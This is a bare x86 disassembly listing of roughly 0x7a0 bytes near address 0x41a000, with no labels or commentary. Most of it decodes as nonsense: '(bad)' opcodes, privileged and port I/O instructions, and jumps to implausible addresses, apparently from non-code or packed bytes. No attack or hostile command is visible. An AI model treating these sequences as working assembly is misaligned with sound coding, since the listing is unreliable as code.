  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
